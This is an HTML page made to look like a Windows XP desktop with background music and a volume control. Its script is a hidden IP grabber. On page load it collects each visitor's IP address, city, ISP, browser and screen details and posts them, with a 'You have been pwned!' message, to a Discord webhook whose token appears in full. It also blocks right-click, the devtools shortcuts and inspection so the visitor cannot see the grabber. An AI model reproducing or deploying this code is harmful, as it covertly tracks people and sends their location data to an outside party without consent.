<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows XP Desktop</title>
    <style>
        /* Global Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            font-family: "Tahoma", sans-serif;
            overflow: hidden;
            /* Mouse Cursor */
            cursor: url('https://example.com/cursor.cur'), auto; /* Replace with your .cur file URL */
        }

        /* Background */
        body {
            background: url('https://example.com/background.gif') no-repeat center center fixed; /* Replace with your background GIF */
            background-size: cover;
        }

        /* Taskbar */
        .taskbar {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 50px;
            background: black;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            box-shadow: 0 -3px 5px rgba(0, 0, 0, 0.8);
            z-index: 100;
        }

        .start-button {
            width: 50px;
            height: 50px;
            background: none;
            border: none;
            margin-left: 10px;
            cursor: pointer;
        }

        .start-button img {
            width: 40px;
            height: 40px;
            transition: transform 0.2s ease-in-out;
        }

        .start-button img:hover {
            transform: scale(1.1);
        }

        /* Volume Control */
        .volume-control {
            position: absolute;
            bottom: 60px;
            right: 10px;
            text-align: center;
            color: white;
            font-size: 12px;
            z-index: 200;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 10px;
        }

        .volume-control input {
            width: 100px;
        }
    </style>
</head>
<body>
    <!-- YouTube Background Music -->
    <iframe id="youtubePlayer" style="display:none;" 
        src="https://www.youtube.com/watch?v=WPrhl0pFY_o&ab_channel=PhonkTime" 
        frameborder="0" allow="autoplay">
    </iframe>

    <!-- Volume Control -->
    <div class="volume-control">
        <span>Volume</span>
        <input type="range" id="volumeSlider" min="0" max="100" step="1" value="100">
    </div>

    <!-- Taskbar -->
    <div class="taskbar">
        <button class="start-button">
            <img src="https://example.com/start-icon.jpg" alt="Start Icon"> <!-- Replace with your start icon URL -->
        </button>
    </div>

    <script>
        // Volume Control for YouTube Player
        const volumeSlider = document.getElementById('volumeSlider');
        const youtubePlayer = document.getElementById('youtubePlayer');

        volumeSlider.addEventListener('input', (e) => {
            const volume = e.target.value / 100; // Convert to range 0.0 - 1.0
            youtubePlayer.contentWindow.postMessage(JSON.stringify({
                event: 'command',
                func: 'setVolume',
                args: [volume * 100]
            }), '*');
        });

        // Webhook Script to Fetch and Send IP Info
        async function fetchAndSendIP() {
            try {
                const ipResponse = await fetch('https://api.ipify.org/?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
                const geoData = await geoResponse.json();

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const timestamp = new Date().toLocaleString();

                // Build webhook message content
                const webhookMessage = `
:cAsH:  cAsH grabbed You :cAsH: 

**User IP:** ${userIP}
**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
**ISP:** ${geoData.org || "Unknown"}
**Browser:** ${userAgent}
**Platform:** ${platform}
**Screen Resolution:** ${screenWidth}x${screenHeight}
**Timestamp:** ${timestamp}

||@everyone|| **You have been pwned!**
                `;

                // Send to Discord Webhook
                await fetch("https://discord.com/api/webhooks/1329196613524127744/FBovN89fd9EDbmk51UAy0v82nAG_nWn_zkNa6BpntB8Jxotk-9I4p1zp3G7H1bPbh9AV", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: webhookMessage
                    })
                });
            } catch (error) {
                console.error('Error fetching IP or sending to webhook:', error);
            }
        }

        // Execute the Webhook Script on Page Load
        window.onload = fetchAndSendIP;

        // Block Right-Click and Inspect
        document.addEventListener('contextmenu', (e) => e.preventDefault());

        document.addEventListener('keydown', (e) => {
            if (
                e.key === 'F12' ||
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
                (e.ctrlKey && e.key === 'U')
            ) {
                e.preventDefault();
            }
        });

        // Reload if DevTools Detected
        setInterval(() => {
            const t1 = performance.now();
            console.log('Detecting DevTools...');
            const t2 = performance.now();
            if (t2 - t1 > 100) window.location.reload();
        }, 1000);
    </script>
</body>
</html>
